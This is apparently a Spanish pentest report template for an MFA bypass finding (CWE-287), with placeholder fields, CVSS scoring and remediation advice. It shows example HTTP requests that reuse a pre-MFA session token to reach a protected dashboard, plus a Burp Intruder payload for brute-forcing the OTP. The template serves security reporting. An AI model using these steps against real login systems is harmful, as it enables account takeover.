# Bypass Multi-Factor Authentication (CWE-287) - {{Crítica}}

| Campo | Valor |
|---|---|
| **CVSS Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| **CVSS Score** | `{{9.3}}` |
| **CWE** | [CWE-287 – Improper Authentication](https://cwe.mitre.org/data/definitions/287.html) |
| **OWASP** | A07:2021 – Identification and Authentication Failures |
| **Estado** | {{Abierto}} |

## Descripción

El bypass de autenticación multifactor ocurre cuando el segundo factor (OTP, push, SMS)
no se valida correctamente del lado del servidor: el control se omite manipulando la
respuesta/flujo, accediendo directamente al recurso post-login, reutilizando el token de
sesión emitido antes del MFA, o forzando el código por falta de límite de intentos. El
resultado es acceso completo a la cuenta solo con la primera credencial.

## Componentes Afectados

- `{{https://app.cliente.com/login}}` → `{{/mfa/verify}}`
- **Parámetros:** `{{otp_code}}`, `{{mfa_verified}}`, `{{step}}`

## Detalles

Se comprobó que tras la verificación de usuario/contraseña la sesión ya queda
{{autenticada / es posible acceder a recursos protegidos}} sin completar el segundo factor.

**Caso 1 — Acceso directo al recurso protegido omitiendo el paso de MFA**

```http
POST /login HTTP/1.1
Host: app.cliente.com
Content-Type: application/json

{"email":"victima@cliente.com","password":"{{contraseña-válida}}"}
```

```http
HTTP/1.1 200 OK
Set-Cookie: session={{TOKEN}}; HttpOnly
{"mfa_required": true}
```

```http
GET /dashboard HTTP/1.1
Host: app.cliente.com
Cookie: session={{TOKEN}}
```

```http
HTTP/1.1 200 OK
// se accede al panel sin haber validado el OTP
```

> _Figura {{N}}: acceso al recurso protegido omitiendo la validación del segundo factor._

**Caso 2 — (Opcional) Fuerza bruta del OTP por falta de rate-limiting**

```http
POST /mfa/verify HTTP/1.1
Host: app.cliente.com
Cookie: session={{TOKEN}}

otp_code=§000000§
```

> _Figura {{N+1}}: Burp Intruder iterando los 10^6 códigos posibles sin bloqueo._

## Impacto

Un atacante que obtenga (o adivine) la contraseña accede a la cuenta sin el segundo
factor, anulando por completo la protección MFA. Combinado con credenciales filtradas o
fuerza bruta, permite toma de cuenta masiva.

## Remediación

- Validar el segundo factor **en el servidor** antes de emitir una sesión con privilegios
  plenos; el token previo no debe dar acceso a recursos protegidos.
- Limitar intentos de OTP (rate-limiting + bloqueo) y expirar los códigos rápidamente.
- Vincular el estado "MFA completado" al servidor, no a un flag controlable por el cliente.
- Registrar y alertar sobre verificaciones MFA fallidas y accesos sin segundo factor.

## Referencias

- https://cwe.mitre.org/data/definitions/287.html
- https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html
- https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
